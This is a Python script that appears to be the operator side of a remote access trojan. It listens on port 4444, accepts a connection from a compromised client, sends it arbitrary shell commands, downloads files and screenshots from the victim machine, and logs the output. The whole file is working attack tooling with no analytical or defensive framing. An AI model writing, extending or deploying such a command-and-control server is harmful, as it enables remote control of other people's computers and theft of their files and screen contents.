import socket
import os
from datetime import datetime

HOST = '0.0.0.0'
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Listening on {HOST}:{PORT}...")

client_socket, addr = server.accept()
print(f"[+] Connected to {addr}")

os.makedirs("received_files", exist_ok=True)

while True:
    command = input("Enter command: ")
    client_socket.send(command.encode())

    if command.lower() == 'exit':
        break

    elif command.startswith("getfile "):
        status = client_socket.recv(1024)
        if status == b'FILE_FOUND':
            with open(f"received_files/{os.path.basename(command.split()[1])}", 'wb') as f:
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    f.write(data)
            print("[+] File received.")
        else:
            print("[-] File not found on client.")

    elif command.lower() == "screenshot":
        with open("received_files/screenshot.png", 'wb') as f:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                f.write(data)
        print("[+] Screenshot saved.")

    else:
        output = client_socket.recv(4096)
        print(output.decode())

        # Save to log
        with open("logs/command_log.txt", "a") as log:
            log.write(f"{datetime.now()} >> {command}\n{output.decode()}\n")

client_socket.close()
server.close()
